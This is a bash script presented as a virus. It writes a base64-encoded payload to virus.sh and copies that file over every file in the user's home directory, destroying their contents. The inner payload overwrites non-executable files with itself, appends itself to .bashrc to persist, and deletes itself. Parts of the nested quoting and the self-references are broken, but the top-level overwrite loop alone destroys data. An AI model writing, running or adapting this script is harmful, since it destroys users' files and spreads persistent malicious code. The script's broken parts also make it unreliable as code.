#!/bin/bash

# Define the payload
payload='#!/bin/bash

# Obfuscate the payload
obfuscated_payload=$(echo "$(cat <<'EOF'
#!/bin/bash

# Infect all files in the user's home directory
infect_files() {
    for file in $HOME/*; do
        if [ -f "$file" ] && [ ! -x "$file" ]; then
            cp "$0" "$file"
            chmod +x "$file"
        fi
    done
}

# Add the virus to the startup scripts
add_to_startup() {
    startup_file="$HOME/.bashrc"
    if [ -f "$startup_file" ]; then
        echo "$0" >> "$startup_file"
    fi
}

# Run the payload
infect_files
add_to_startup

# Self-destruct
rm -- "$0"
EOF
)" | base64 -w0)")

# Decode and execute the obfuscated payload
echo "$obfuscated_payload" | base64 -d | bash
'

# Create the virus file
echo "$payload" > virus.sh

# Copy the virus to all files in the user's home directory
for file in $HOME/*; do
    cp virus.sh "$file"
done

# Make the copied files executable
chmod +x $HOME/*

# Self-destruct
rm -- "$0"
